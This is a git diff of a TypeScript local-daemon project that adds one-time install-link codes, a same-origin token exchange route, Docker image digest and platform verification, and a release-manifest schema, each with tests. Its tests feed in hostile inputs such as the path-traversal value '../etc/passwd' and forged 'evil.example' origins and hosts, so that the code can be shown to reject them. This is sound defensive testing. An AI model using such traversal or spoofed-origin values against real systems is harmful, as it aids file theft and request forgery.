++export function keydRequirement(teamId: string): string {
++  return [
++    "anchor apple generic",
++    `identifier "${KEYD_IDENTIFIER}"`,
++    "certificate 1[field.1.2.840.113635.100.6.2.6]",
++    "certificate leaf[field.1.2.840.113635.100.6.1.13]",
++    `certificate leaf[subject.OU] = "${teamId}"`,
++  ].join(" and ");
++}
+diff --git a/apps/cli/tsconfig.json b/apps/cli/tsconfig.json
+new file mode 100644
+index 0000000..008c945
+--- /dev/null
++++ b/apps/cli/tsconfig.json
+@@ -0,0 +1 @@
++{ "extends": "../../tsconfig.base.json", "include": ["src"] }
+diff --git a/apps/daemon/src/app.ts b/apps/daemon/src/app.ts
+index f94de83..5829968 100644
+--- a/apps/daemon/src/app.ts
++++ b/apps/daemon/src/app.ts
+@@ -2,6 +2,8 @@ import { ULID_PATTERN } from "@localdot/protocol";
+ import { Hono } from "hono";
+ import { HTTPException } from "hono/http-exception";
+ import { routePath } from "hono/route";
++import type { InstallCodes } from "./auth/install-codes.ts";
++import { exchangeRoute, installCodeRoute } from "./auth/routes.ts";
+ import { type CellApiDeps, cellRoutes } from "./cells/api.ts";
+ import { desktopRoutes, type StreamProxyDeps } from "./cells/stream-proxy.ts";
+ import { errorCode } from "./error-code.ts";
+@@ -17,9 +19,10 @@ export interface AppOptions {
+   cells?: CellApiDeps;
+   desktop?: StreamProxyDeps;
+   ui?: { dir: string };
++  codes?: InstallCodes;
+ }
+ 
+-export function createApp({ token, port, eventLog, cells, desktop, ui }: AppOptions): Hono {
++export function createApp({ token, port, eventLog, cells, desktop, ui, codes }: AppOptions): Hono {
+   const app = new Hono();
+ 
+   // Hono's default handler logs the whole error, and a message can quote a file path or the
+@@ -47,6 +50,8 @@ export function createApp({ token, port, eventLog, cells, desktop, ui }: AppOpti
+   // The Selkies iframe can carry no install token: its routes authorise themselves by ticket.
+   if (desktop) desktopRoutes(app, desktop);
+ 
++  if (codes) exchangeRoute(app, { token, port, codes });
++
+   app.use("/api/*", async (c, next) => {
+     const given = tokenFromHeaders({ authorization: c.req.header("authorization") });
+     if (!tokensMatch(token, given)) return c.text("unauthorized", 401);
+@@ -55,6 +60,8 @@ export function createApp({ token, port, eventLog, cells, desktop, ui }: AppOpti
+ 
+   app.get("/api/whoami", (c) => c.json({ ok: true }));
+ 
++  if (codes) installCodeRoute(app, { codes });
++
+   app.get("/api/sessions", (c) => c.json(eventLog.listSessions()));
+ 
+   app.get("/api/sessions/:id/events", (c) => {
+diff --git a/apps/daemon/src/auth/install-codes.test.ts b/apps/daemon/src/auth/install-codes.test.ts
+new file mode 100644
+index 0000000..1f293ff
+--- /dev/null
++++ b/apps/daemon/src/auth/install-codes.test.ts
+@@ -0,0 +1,73 @@
++import { describe, expect, it } from "vitest";
++import { CODE_PATTERN, CODE_TTL_MS, InstallCodes, MAX_LIVE_CODES } from "./install-codes.ts";
++
++function clock(start = 1_000_000) {
++  let t = start;
++  return { now: () => t, advance: (ms: number) => (t += ms) };
++}
++
++describe("install codes", () => {
++  it("mints 43-character base64url codes that are all different", () => {
++    const codes = new InstallCodes();
++    const seen = new Set<string>();
++    for (let i = 0; i < 50; i++) {
++      const { code } = codes.mint();
++      expect(code).toMatch(CODE_PATTERN);
++      seen.add(code);
++      codes.redeem(code);
++    }
++    expect(seen.size).toBe(50);
++  });
++
++  it("redeems a code once: a replay is refused", () => {
++    const codes = new InstallCodes();
++    const { code } = codes.mint();
++    expect(codes.redeem(code)).toBe(true);
++    expect(codes.redeem(code)).toBe(false);
++  });
++
++  it("refuses a code at its expiry and spends it", () => {
++    const c = clock();
++    const codes = new InstallCodes({ now: c.now });
++    const { code, expiresAt } = codes.mint();
++    expect(expiresAt).toBe(c.now() + CODE_TTL_MS);
++    c.advance(CODE_TTL_MS - 1);
++    const early = codes.mint();
++    c.advance(1);
++    expect(codes.redeem(code)).toBe(false);
++    expect(codes.redeem(early.code)).toBe(true);
++  });
++
++  it("refuses unknown, malformed and non-string codes without spending a live one", () => {
++    const codes = new InstallCodes();
++    const { code } = codes.mint();
++    for (const bad of [
++      undefined,
++      null,
++      42,
++      {},
++      "",
++      "short",
++      `${code}x`,
++      code.slice(1),
++      code.replace(/./, "+"),
++    ]) {
++      expect(codes.redeem(bad)).toBe(false);
++    }
++    expect(codes.redeem("A".repeat(43))).toBe(false);
++    expect(codes.redeem(code)).toBe(true);
++  });
++
++  it("keeps at most four live codes, dropping the oldest", () => {
++    const codes = new InstallCodes();
++    const minted = Array.from({ length: MAX_LIVE_CODES + 1 }, () => codes.mint().code);
++    expect(codes.size).toBe(MAX_LIVE_CODES);
++    expect(codes.redeem(minted[0])).toBe(false);
++    for (const code of minted.slice(1)) expect(codes.redeem(code)).toBe(true);
++  });
++
++  it("refuses to mint from a short random source", () => {
++    const codes = new InstallCodes({ random: () => Buffer.alloc(16) });
++    expect(() => codes.mint()).toThrow(/too few bytes/);
++  });
++});
+diff --git a/apps/daemon/src/auth/install-codes.ts b/apps/daemon/src/auth/install-codes.ts
+new file mode 100644
+index 0000000..6691698
+--- /dev/null
++++ b/apps/daemon/src/auth/install-codes.ts
+@@ -0,0 +1,72 @@
++import { createHash, randomBytes } from "node:crypto";
++
++// A one-time install link (`#code=`) is exchanged once, within CODE_TTL_MS, for the install token.
++// The browser's history then keeps only a dead code (spec, "Risks": later hardening, M9).
++export const CODE_TTL_MS = 60_000;
++export const MAX_LIVE_CODES = 4;
++// randomBytes(32) in base64url: exactly 43 characters, like the install token.
++export const CODE_PATTERN = /^[A-Za-z0-9_-]{43}$/;
++
++export interface MintedCode {
++  code: string;
++  expiresAt: number;
++}
++
++export interface InstallCodesOptions {
++  now?: () => number;
++  random?: (bytes: number) => Buffer;
++}
++
++// Codes live in memory only, as SHA-256 digests, so a heap dump or a log line never holds a live
++// one, and a daemon restart kills every outstanding link. A code is spent by its first redeem
++// attempt, whatever the outcome, and the oldest live code is dropped when a fifth is minted.
++export class InstallCodes {
++  readonly #live = new Map<string, number>();
++  readonly #now: () => number;
++  readonly #random: (bytes: number) => Buffer;
++
++  constructor({ now = Date.now, random = randomBytes }: InstallCodesOptions = {}) {
++    this.#now = now;
++    this.#random = random;
++  }
++
++  mint(): MintedCode {
++    this.#sweep();
++    while (this.#live.size >= MAX_LIVE_CODES) {
++      const oldest = this.#live.keys().next().value;
++      if (oldest === undefined) break;
++      this.#live.delete(oldest);
++    }
++    const code = this.#random(32).toString("base64url");
++    if (!CODE_PATTERN.test(code))
++      throw new Error("install code: the random source gave too few bytes");
++    const expiresAt = this.#now() + CODE_TTL_MS;
++    this.#live.set(digest(code), expiresAt);
++    return { code, expiresAt };
++  }
++
++  redeem(code: unknown): boolean {
++    this.#sweep();
++    if (typeof code !== "string" || !CODE_PATTERN.test(code)) return false;
++    const key = digest(code);
++    const expiresAt = this.#live.get(key);
++    this.#live.delete(key);
++    return expiresAt !== undefined && this.#now() < expiresAt;
++  }
++
++  get size(): number {
++    this.#sweep();
++    return this.#live.size;
++  }
++
++  #sweep(): void {
++    const now = this.#now();
++    for (const [key, expiresAt] of this.#live) {
++      if (now >= expiresAt) this.#live.delete(key);
++    }
++  }
++}
++
++function digest(code: string): string {
++  return createHash("sha256").update(code).digest("hex");
++}
+diff --git a/apps/daemon/src/auth/routes.test.ts b/apps/daemon/src/auth/routes.test.ts
+new file mode 100644
+index 0000000..cbc4e4e
+--- /dev/null
++++ b/apps/daemon/src/auth/routes.test.ts
+@@ -0,0 +1,116 @@
++import { mkdtempSync } from "node:fs";
++import { tmpdir } from "node:os";
++import { join } from "node:path";
++import { describe, expect, it } from "vitest";
++import { createApp } from "../app.ts";
++import { EventLog } from "../event-log.ts";
++import { CODE_TTL_MS, InstallCodes } from "./install-codes.ts";
++
++const PORT = 4750;
++const TOKEN = "t".repeat(43);
++const ORIGIN = `http://127.0.0.1:${PORT}`;
++const eventLog = new EventLog(mkdtempSync(join(tmpdir(), "local dot's auth-")));
++
++function setup(now = () => 1_000_000) {
++  const codes = new InstallCodes({ now });
++  const app = createApp({ token: TOKEN, port: PORT, eventLog, codes });
++  const mint = async () => {
++    const res = await app.request(`${ORIGIN}/api/install-codes`, {
++      method: "POST",
++      headers: { authorization: `Bearer ${TOKEN}` },
++    });
++    expect(res.status).toBe(201);
++    expect(res.headers.get("cache-control")).toBe("no-store");
++    return ((await res.json()) as { code: string }).code;
++  };
++  const exchange = (body: unknown, headers: Record<string, string> = {}) =>
++    app.request(`${ORIGIN}/auth/exchange`, {
++      method: "POST",
++      headers: { origin: ORIGIN, "content-type": "application/json", ...headers },
++      body: typeof body === "string" ? body : JSON.stringify(body),
++    });
++  return { app, codes, mint, exchange };
++}
++
++describe("one-time install links (Review Focus 3: an install link replayed or leaked)", () => {
++  it("mints only for the token holder", async () => {
++    const { app } = setup();
++    const res = await app.request(`${ORIGIN}/api/install-codes`, { method: "POST" });
++    expect(res.status).toBe(401);
++  });
++
++  it("exchanges a fresh code for the token once, and refuses the replay", async () => {
++    const { mint, exchange } = setup();
++    const code = await mint();
++    const first = await exchange({ code });
++    expect(first.status).toBe(200);
++    expect(first.headers.get("cache-control")).toBe("no-store");
++    expect(await first.json()).toEqual({ token: TOKEN });
++    const replay = await exchange({ code });
++    expect(replay.status).toBe(401);
++    expect(await replay.json()).toEqual({ error: "invalid-code" });
++  });
++
++  it("refuses a code leaked from history after it expired, with the same answer as an unknown one", async () => {
++    let t = 1_000_000;
++    const { mint, exchange } = setup(() => t);
++    const code = await mint();
++    t += CODE_TTL_MS;
++    const expired = await exchange({ code });
++    const unknown = await exchange({ code: "B".repeat(43) });
++    expect(expired.status).toBe(401);
++    expect(unknown.status).toBe(401);
++    expect(await expired.text()).toBe(await unknown.text());
++  });
++
++  it("answers only a same-origin page", async () => {
++    const { app, mint, exchange } = setup();
++    const code = await mint();
++    const noOrigin = await app.request(`${ORIGIN}/auth/exchange`, {
++      method: "POST",
++      headers: { "content-type": "application/json" },
++      body: JSON.stringify({ code }),
++    });
++    expect(noOrigin.status).toBe(403);
++    for (const origin of ["http://evil.example", "null", `http://127.0.0.1:${PORT + 1}`]) {
++      expect((await exchange({ code }, { origin })).status).toBe(403);
++    }
++    expect((await exchange({ code }, { origin: `http://localhost:${PORT}` })).status).toBe(200);
++  });
++
++  it("does not spend a code on a request refused before the redeem", async () => {
++    const { mint, exchange } = setup();
++    const code = await mint();
++    expect((await exchange({ code }, { origin: "http://evil.example" })).status).toBe(403);
++    expect((await exchange({ code }, { "content-type": "text/plain" })).status).toBe(415);
++    expect((await exchange(`{"code":"${code}","pad":"${"x".repeat(2000)}"}`)).status).toBe(413);
++    expect((await exchange({ code })).status).toBe(200);
++  });
++
++  it("refuses malformed bodies with the same 401", async () => {
++    const { exchange } = setup();
++    for (const body of ["not json", "null", "[]", "{}", JSON.stringify({ code: 7 })]) {
++      const res = await exchange(body);
++      expect(res.status).toBe(401);
++      expect(await res.json()).toEqual({ error: "invalid-code" });
++    }
++  });
++
++  it("keeps the Host guard in front of the exchange", async () => {
++    const { mint, app } = setup();
++    const code = await mint();
++    const res = await app.request(`${ORIGIN}/auth/exchange`, {
++      method: "POST",
++      headers: { host: "evil.example", origin: ORIGIN, "content-type": "application/json" },
++      body: JSON.stringify({ code }),
++    });
++    expect(res.status).toBe(403);
++  });
++
++  it("a GET or the token route never hands out the token", async () => {
++    const { app } = setup();
++    expect((await app.request(`${ORIGIN}/auth/exchange`)).status).toBe(404);
++    const res = await app.request(`${ORIGIN}/api/whoami`);
++    expect(res.status).toBe(401);
++  });
++});
+diff --git a/apps/daemon/src/auth/routes.ts b/apps/daemon/src/auth/routes.ts
+new file mode 100644
+index 0000000..560e0e4
+--- /dev/null
++++ b/apps/daemon/src/auth/routes.ts
+@@ -0,0 +1,48 @@
++import type { Hono } from "hono";
++import { isAllowedOrigin } from "../guard.ts";
++import type { InstallCodes } from "./install-codes.ts";
++
++export interface AuthRouteDeps {
++  token: string;
++  port: number;
++  codes: InstallCodes;
++}
++
++const NO_STORE = { "cache-control": "no-store" };
++const MAX_EXCHANGE_BODY = 1024;
++const REFUSED = { error: "invalid-code" } as const;
++
++// POST /api/install-codes sits behind the token middleware: only a holder of the token (the CLI,
++// which reads the 0600 token file) can mint a link. Register it after that middleware.
++export function installCodeRoute(app: Hono, { codes }: Pick<AuthRouteDeps, "codes">): void {
++  app.post("/api/install-codes", (c) => {
++    const { code, expiresAt } = codes.mint();
++    return c.json({ code, expiresAt }, 201, NO_STORE);
++  });
++}
++
++// POST /auth/exchange is the one route that hands out the token without it. It answers only a
++// same-origin page (a browser always sends Origin on a POST; the global guard has already checked
++// Host and any Origin against this port), and every refusal is the same 401, so it is no oracle
++// for which codes were used, expired or never minted. Register it before the token middleware.
++export function exchangeRoute(app: Hono, { token, port, codes }: AuthRouteDeps): void {
++  app.post("/auth/exchange", async (c) => {
++    const origin = c.req.header("origin");
++    if (origin === undefined || !isAllowedOrigin(origin, port)) {
++      return c.json(REFUSED, 403, NO_STORE);
++    }
++    if (!(c.req.header("content-type") ?? "").startsWith("application/json")) {
++      return c.json(REFUSED, 415, NO_STORE);
++    }
++    const text = await c.req.text();
++    if (text.length > MAX_EXCHANGE_BODY) return c.json(REFUSED, 413, NO_STORE);
++    let code: unknown;
++    try {
++      code = (JSON.parse(text) as { code?: unknown } | null)?.code;
++    } catch {
++      code = undefined;
++    }
++    if (!codes.redeem(code)) return c.json(REFUSED, 401, NO_STORE);
++    return c.json({ token }, 200, NO_STORE);
++  });
++}
+diff --git a/apps/daemon/src/cells/image-check.test.ts b/apps/daemon/src/cells/image-check.test.ts
+new file mode 100644
+index 0000000..fd6b2cf
+--- /dev/null
++++ b/apps/daemon/src/cells/image-check.test.ts
+@@ -0,0 +1,68 @@
++import { ImagePin, imageRef } from "@localdot/protocol";
++import { sampleManifest } from "@localdot/protocol/testing";
++import { describe, expect, it } from "vitest";
++import { DockerError } from "./docker.ts";
++import { verifyImage } from "./image-check.ts";
++
++const pin = ImagePin.parse(sampleManifest().images.desktop);
++const ref = imageRef(pin);
++const docker = (answer: unknown | Error) => ({
++  request: async <T>() => {
++    if (answer instanceof Error) throw answer;
++    return answer as T;
++  },
++});
++
++describe("verifyImage (Review Focus 5: doctor on arm64 versus amd64 images)", () => {
++  it("accepts the pinned digest for the engine's platform, whatever Docker calls arm64", async () => {
++    const inspect = { RepoDigests: [ref], Os: "linux", Architecture: "arm64" };
++    expect(await verifyImage(docker(inspect), pin, "arm64")).toEqual({
++      ok: true,
++      ref,
++      arch: "arm64",
++    });
++    expect(
++      (await verifyImage(docker({ ...inspect, Architecture: "aarch64" }), pin, "arm64")).ok,
++    ).toBe(true);
++  });
++
++  it("refuses an amd64 image on an arm64 engine, and says how to fix it", async () => {
++    const v = await verifyImage(
++      docker({ RepoDigests: [ref], Os: "linux", Architecture: "amd64" }),
++      pin,
++      "arm64",
++    );
++    expect(v).toMatchObject({ ok: false, reason: "platform" });
++    expect(v.ok === false && v.detail).toMatch(
++      /linux\/amd64 but Docker runs linux\/arm64.*DOCKER_DEFAULT_PLATFORM/,
++    );
++  });
++
++  it("refuses an arm64 image on an amd64 engine", async () => {
++    const v = await verifyImage(
++      docker({ RepoDigests: [ref], Os: "linux", Architecture: "arm64" }),
++      pin,
++      "x86_64",
++    );
++    expect(v).toMatchObject({ ok: false, reason: "platform" });
++  });
++
++  it("refuses an image Docker holds under another digest", async () => {
++    const other = `${pin.repository}@sha256:${"f".repeat(64)}`;
++    const v = await verifyImage(
++      docker({ RepoDigests: [other], Os: "linux", Architecture: "arm64" }),
++      pin,
++      "arm64",
++    );
++    expect(v).toMatchObject({ ok: false, reason: "digest" });
++  });
++
++  it("reports a missing image and an engine error apart", async () => {
++    expect(
++      await verifyImage(docker(new DockerError(404, "No such image", "/images")), pin, "arm64"),
++    ).toMatchObject({ reason: "missing" });
++    expect(
++      await verifyImage(docker(new DockerError(0, "ECONNREFUSED", "/images")), pin, "arm64"),
++    ).toMatchObject({ reason: "error" });
++  });
++});
+diff --git a/apps/daemon/src/cells/image-check.ts b/apps/daemon/src/cells/image-check.ts
+new file mode 100644
+index 0000000..72410a4
+--- /dev/null
++++ b/apps/daemon/src/cells/image-check.ts
+@@ -0,0 +1,66 @@
++import { type ImagePin, imageRef } from "@localdot/protocol";
++import { type DockerClient, DockerError } from "./docker.ts";
++
++export type ImageVerdict =
++  | { ok: true; ref: string; arch: string }
++  | { ok: false; ref: string; reason: "missing" | "digest" | "platform" | "error"; detail: string };
++
++interface ImageInspect {
++  RepoDigests?: string[] | null;
++  Os?: string;
++  Architecture?: string;
++  Variant?: string;
++}
++
++// Docker's names for the engine's architecture (/version Arch) and an image's (Architecture).
++const ARCH_ALIASES: Record<string, string> = { aarch64: "arm64", x86_64: "amd64" };
++export const normalArch = (arch: string) => ARCH_ALIASES[arch] ?? arch;
++
++// A cell image is usable only as exactly the pinned digest, for the engine's own platform. Docker
++// verifies content against a digest when it pulls; this checks that what it holds under the
++// reference is that pull (RepoDigests) and that it will not run under emulation: an amd64 desktop
++// on Apple silicon runs under Rosetta or QEMU, where XTest timing and the stream's CPU budget no
++// longer hold (Review Focus 5).
++export async function verifyImage(
++  docker: Pick<DockerClient, "request">,
++  pin: ImagePin,
++  engineArch: string,
++): Promise<ImageVerdict> {
++  const ref = imageRef(pin);
++  let info: ImageInspect;
++  try {
++    info = await docker.request<ImageInspect>({
++      method: "GET",
++      path: `/images/${encodeURIComponent(ref)}/json`,
++    });
++  } catch (err) {
++    if (err instanceof DockerError && err.status === 404) {
++      return { ok: false, ref, reason: "missing", detail: `${ref} is not pulled` };
++    }
++    return {
++      ok: false,
++      ref,
++      reason: "error",
++      detail: err instanceof Error ? err.message : String(err),
++    };
++  }
++  if (!(info.RepoDigests ?? []).includes(ref)) {
++    return {
++      ok: false,
++      ref,
++      reason: "digest",
++      detail: `Docker holds ${pin.repository} under other digests (${(info.RepoDigests ?? []).join(", ") || "none"})`,
++    };
++  }
++  const want = normalArch(engineArch);
++  const got = normalArch(info.Architecture ?? "unknown");
++  if (info.Os !== "linux" || got !== want) {
++    return {
++      ok: false,
++      ref,
++      reason: "platform",
++      detail: `the image is ${info.Os ?? "unknown"}/${got} but Docker runs linux/${want}: it would run under emulation. Remove it (docker image rm ${ref}) and pull again with no DOCKER_DEFAULT_PLATFORM set`,
++    };
++  }
++  return { ok: true, ref, arch: got };
++}
+diff --git a/apps/daemon/src/startup-lines.test.ts b/apps/daemon/src/startup-lines.test.ts
+new file mode 100644
+index 0000000..18d27e8
+--- /dev/null
++++ b/apps/daemon/src/startup-lines.test.ts
+@@ -0,0 +1,30 @@
++import { describe, expect, it } from "vitest";
++import { startupLines } from "./startup-lines.ts";
++
++const TOKEN = "t".repeat(43);
++
++describe("startup lines", () => {
++  it("never print the token when launchd runs the daemon", () => {
++    const lines = startupLines({
++      port: 4750,
++      token: TOKEN,
++      tokenFile: "/h/daemon-token",
++      supervised: true,
++    });
++    expect(lines.join("\n")).not.toContain(TOKEN);
++    expect(lines.join("\n")).not.toContain("#token=");
++    expect(lines).toEqual([
++      "localdot daemon on http://127.0.0.1:4750; open it with: localdot open",
++    ]);
++  });
++
++  it("keep the #token= link for a daemon started by hand", () => {
++    const lines = startupLines({
++      port: 4790,
++      token: TOKEN,
++      tokenFile: "/h/daemon-token",
++      supervised: false,
++    });
++    expect(lines[1]).toBe(`open http://127.0.0.1:4790/#token=${TOKEN}`);
++  });
++});
+diff --git a/apps/daemon/src/startup-lines.ts b/apps/daemon/src/startup-lines.ts
+new file mode 100644
+index 0000000..868502f
+--- /dev/null
++++ b/apps/daemon/src/startup-lines.ts
+@@ -0,0 +1,15 @@
++// What the daemon prints when it starts. Under launchd (LOCALDOT_SUPERVISED=1) stdout goes to
++// <home>/logs/daemon.log, which must never hold the install token: the CLI opens a one-time
++// #code= link instead. A daemon run by hand in a terminal keeps P2-R7's #token= link.
++export interface StartupInfo {
++  port: number;
++  token: string;
++  tokenFile: string;
++  supervised: boolean;
++}
++
++export function startupLines({ port, token, tokenFile, supervised }: StartupInfo): string[] {
++  const origin = `http://127.0.0.1:${port}`;
++  if (supervised) return [`localdot daemon on ${origin}; open it with: localdot open`];
++  return [`localdot daemon on ${origin} (token in ${tokenFile})`, `open ${origin}/#token=${token}`];
++}
+diff --git a/apps/web/src/lib/install-link.test.ts b/apps/web/src/lib/install-link.test.ts
+new file mode 100644
+index 0000000..aad98ed
+--- /dev/null
++++ b/apps/web/src/lib/install-link.test.ts
+@@ -0,0 +1,100 @@
++import { describe, expect, it, vi } from "vitest";
++import { CODE_PATTERN, exchangeCode, takeFragmentLink } from "./install-link.ts";
++
++const CODE = "c".repeat(43);
++const TOKEN = "t".repeat(43);
++
++function host(hash: string) {
++  const replaceState = vi.fn();
++  const localStorage = { getItem: vi.fn(), setItem: vi.fn(), removeItem: vi.fn() };
++  return {
++    location: { hash, pathname: "/", search: "" },
++    localStorage,
++    history: { replaceState },
++    replaceState,
++  };
++}
++
++describe("takeFragmentLink", () => {
++  it("takes a code and clears the fragment before anything else", () => {
++    const h = host(`#code=${CODE}`);
++    expect(takeFragmentLink(h)).toEqual({ kind: "code", code: CODE });
++    expect(h.replaceState).toHaveBeenCalledWith(null, "", "/");
++    expect(h.localStorage.setItem).not.toHaveBeenCalled();
++  });
++
++  it("prefers the code when a link carries both", () => {
++    expect(takeFragmentLink(host(`#token=${TOKEN}&code=${CODE}`))).toEqual({
++      kind: "code",
++      code: CODE,
++    });
++  });
++
++  it("still takes a development #token=", () => {
++    expect(takeFragmentLink(host(`#token=${TOKEN}`))).toEqual({ kind: "token", token: TOKEN });
++  });
++
++  it("clears and reports a malformed code or token", () => {
++    for (const hash of ["#code=abc", `#code=${CODE}x`, "#token=short", "#code="]) {
++      const h = host(hash);
++      expect(takeFragmentLink(h)).toEqual({ kind: "malformed" });
++      expect(h.replaceState).toHaveBeenCalledOnce();
++    }
++  });
++
++  it("leaves other fragments alone", () => {
++    const h = host("#settings");
++    expect(takeFragmentLink(h)).toBeNull();
++    expect(h.replaceState).not.toHaveBeenCalled();
++  });
++
++  it("matches the daemon's code shape", () => {
++    // randomBytes(32).toString("base64url") on the daemon: 43 characters of the URL-safe alphabet.
++    expect(CODE_PATTERN.test(`${"A".repeat(42)}_`)).toBe(true);
++    expect(CODE_PATTERN.test(`${"A".repeat(42)}=`)).toBe(false);
++  });
++});
++
++describe("exchangeCode", () => {
++  it("posts the code same-origin with no credentials, cache or referrer", async () => {
++    const fetchImpl = vi.fn(
++      async () => new Response(JSON.stringify({ token: TOKEN }), { status: 200 }),
++    );
++    expect(await exchangeCode(CODE, fetchImpl as unknown as typeof fetch)).toEqual({
++      kind: "token",
++      token: TOKEN,
++    });
++    expect(fetchImpl).toHaveBeenCalledWith("/auth/exchange", {
++      method: "POST",
++      headers: { "content-type": "application/json" },
++      body: JSON.stringify({ code: CODE }),
++      credentials: "omit",
++      cache: "no-store",
++      referrerPolicy: "no-referrer",
++    });
++  });
++
++  it("says refused for a used or expired code, and unreachable for no answer", async () => {
++    const refused = vi.fn(async () => new Response('{"error":"invalid-code"}', { status: 401 }));
++    const down = vi.fn(async () => {
++      throw new TypeError("Failed to fetch");
++    });
++    const busy = vi.fn(async () => new Response("", { status: 503 }));
++    expect(await exchangeCode(CODE, refused as unknown as typeof fetch)).toEqual({
++      kind: "refused",
++    });
++    expect(await exchangeCode(CODE, down as unknown as typeof fetch)).toEqual({
++      kind: "unreachable",
++    });
++    expect(await exchangeCode(CODE, busy as unknown as typeof fetch)).toEqual({
++      kind: "unreachable",
++    });
++  });
++
++  it("refuses an answer that is not a token", async () => {
++    for (const body of ["{}", '{"token":7}', '{"token":"short"}', "not json"]) {
++      const f = vi.fn(async () => new Response(body, { status: 200 }));
++      expect(await exchangeCode(CODE, f as unknown as typeof fetch)).toEqual({ kind: "refused" });
++    }
++  });
++});
+diff --git a/apps/web/src/lib/install-link.ts b/apps/web/src/lib/install-link.ts
+new file mode 100644
+index 0000000..cf72a48
+--- /dev/null
++++ b/apps/web/src/lib/install-link.ts
+@@ -0,0 +1,57 @@
++import type { TokenHost } from "./token.ts";
++
++// The CLI opens http://127.0.0.1:4750/#code=<c>: a one-time code the page exchanges for the install
++// token, so the browser's history keeps only a dead code. `#token=` stays for development and the
++// e2e harness. Either fragment leaves the address bar before anything else happens.
++export const CODE_PATTERN = /^[A-Za-z0-9_-]{43}$/;
++const TOKEN_SHAPE = /^[A-Za-z0-9_-]{43}$/;
++
++export type FragmentLink =
++  | { kind: "code"; code: string }
++  | { kind: "token"; token: string }
++  | { kind: "malformed" };
++
++export function takeFragmentLink(host: TokenHost = window): FragmentLink | null {
++  const params = new URLSearchParams(host.location.hash.replace(/^#/, ""));
++  const code = params.get("code");
++  const token = params.get("token");
++  if (code === null && token === null) return null;
++  host.history.replaceState(null, "", `${host.location.pathname}${host.location.search}`);
++  if (code !== null)
++    return CODE_PATTERN.test(code) ? { kind: "code", code } : { kind: "malformed" };
++  return token !== null && TOKEN_SHAPE.test(token)
++    ? { kind: "token", token }
++    : { kind: "malformed" };
++}
++
++export type Exchanged =
++  | { kind: "token"; token: string }
++  | { kind: "refused" }
++  | { kind: "unreachable" };
++
++// Same origin, no credentials, never cached and no referrer: the code goes only to this daemon.
++export async function exchangeCode(
++  code: string,
++  fetchImpl: typeof fetch = fetch,
++): Promise<Exchanged> {
++  let res: Response;
++  try {
++    res = await fetchImpl("/auth/exchange", {
++      method: "POST",
++      headers: { "content-type": "application/json" },
++      body: JSON.stringify({ code }),
++      credentials: "omit",
++      cache: "no-store",
++      referrerPolicy: "no-referrer",
++    });
++  } catch {
++    return { kind: "unreachable" };
++  }
++  if (res.status >= 500) return { kind: "unreachable" };
++  if (res.status !== 200) return { kind: "refused" };
++  const body = (await res.json().catch(() => null)) as { token?: unknown } | null;
++  const token = body?.token;
++  return typeof token === "string" && TOKEN_SHAPE.test(token)
++    ? { kind: "token", token }
++    : { kind: "refused" };
++}
+diff --git a/packages/protocol/package.json b/packages/protocol/package.json
+index 40499db..c4254c3 100644
+--- a/packages/protocol/package.json
++++ b/packages/protocol/package.json
+@@ -4,7 +4,8 @@
+   "private": true,
+   "type": "module",
+   "exports": {
+-    ".": "./src/index.ts"
++    ".": "./src/index.ts",
++    "./testing": "./src/testing/index.ts"
+   },
+   "scripts": {
+     "typecheck": "tsc --noEmit -p .",
+diff --git a/packages/protocol/src/index.ts b/packages/protocol/src/index.ts
+index 0867705..06f2fce 100644
+--- a/packages/protocol/src/index.ts
++++ b/packages/protocol/src/index.ts
+@@ -2,4 +2,5 @@ export * from "./events.ts";
+ export * from "./geometry.ts";
+ export * from "./ids.ts";
+ export * from "./input.ts";
++export * from "./release.ts";
+ export * from "./target.ts";
+diff --git a/packages/protocol/src/release.test.ts b/packages/protocol/src/release.test.ts
+new file mode 100644
+index 0000000..dc9385b
+--- /dev/null
++++ b/packages/protocol/src/release.test.ts
+@@ -0,0 +1,51 @@
++import { describe, expect, it } from "vitest";
++import { imageRef, PackagePath, ReleaseManifest } from "./release.ts";
++import { type SampleManifest, sampleManifest } from "./testing/sample-release.ts";
++
++const hex = (c: string) => c.repeat(64);
++
++describe("release manifest", () => {
++  it("accepts a complete manifest and builds digest references", () => {
++    const m = ReleaseManifest.parse(sampleManifest());
++    expect(imageRef(m.images.desktop)).toBe(
++      `ghcr.io/shadowhusky/localdot-desktop@sha256:${hex("a")}`,
++    );
++  });
++
++  it.each([
++    ["a tag instead of a digest", (m: SampleManifest) => (m.images.gate.digest = "latest")],
++    ["an image without arm64", (m: SampleManifest) => (m.images.brain.platforms = ["linux/amd64"])],
++    [
++      "an image outside ghcr.io",
++      (m: SampleManifest) => (m.images.desktop.repository = "docker.io/evil/localdot-desktop"),
++    ],
++    ["a range version", (m: SampleManifest) => (m.version = "^1.0.0")],
++    [
++      "an unknown field",
++      (m: SampleManifest) => ((m as unknown as Record<string, unknown>).postinstall = "x"),
++    ],
++    ["a short keyd hash", (m: SampleManifest) => (m.keyd.sha256 = "abc")],
++    ["another keyd identifier", (m: SampleManifest) => (m.keyd.identifier = "com.evil.keyd")],
++    ["an empty file list", (m: SampleManifest) => (m.files = {})],
++  ])("refuses %s", (_label, mutate) => {
++    const m = sampleManifest();
++    mutate(m);
++    expect(ReleaseManifest.safeParse(m).success).toBe(false);
++  });
++
++  it.each(["../etc/passwd", "/abs", "a//b", "a/./b", "a/../b", "a\\b", "", ".hidden/x", "dist/"])(
++    "refuses the package path %j",
++    (p) => {
++      expect(PackagePath.safeParse(p).success).toBe(false);
++    },
++  );
++
++  it.each([
++    "dist/cli.mjs",
++    "web/assets/index-Ab1.js",
++    "web/vendor/selkies/LICENSE",
++    "THIRD-PARTY.md",
++  ])("accepts the package path %j", (p) => {
++    expect(PackagePath.safeParse(p).success).toBe(true);
++  });
++});
+diff --git a/packages/protocol/src/release.ts b/packages/protocol/src/release.ts
+new file mode 100644
+index 0000000..fc17642
+--- /dev/null
++++ b/packages/protocol/src/release.ts
+@@ -0,0 +1,60 @@
++import { z } from "zod";
++
++// release.json: what one localdot version is made of. The release workflow writes it into the npm
++// package; the installer and `localdot update` verify a staged copy against it before anything runs
++// (apps/cli/src/verify/release.ts). Every field is exact: nothing here is a range or a tag.
++
++export const RELEASE_VERSION = /^(0|[1-9]\d*)\.(0|[1-9]\d*)\.(0|[1-9]\d*)(-rc\.(0|[1-9]\d*))?$/;
++export const SHA256_HEX = /^[0-9a-f]{64}$/;
++export const IMAGE_DIGEST = /^sha256:[0-9a-f]{64}$/;
++export const IMAGE_ROLES = ["desktop", "gate", "brain", "browser"] as const;
++export const KEYD_PACKAGE = "@localdot/keyd-darwin-arm64";
++export const KEYD_IDENTIFIER = "dev.localdot.keyd";
++
